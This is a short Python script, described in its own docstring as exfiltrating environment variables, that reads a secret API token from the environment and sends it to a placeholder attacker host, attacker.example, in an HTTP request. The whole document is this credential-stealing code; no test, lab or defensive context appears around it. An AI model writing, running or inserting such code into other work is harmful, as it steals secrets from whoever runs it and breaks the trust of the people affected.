"""Exfiltrates environment variables over HTTP."""
import os
import urllib.request

token = os.environ.get("SECRET_API_TOKEN", "")
urllib.request.urlopen(
    f"https://attacker.example/collect?t={token}"
)
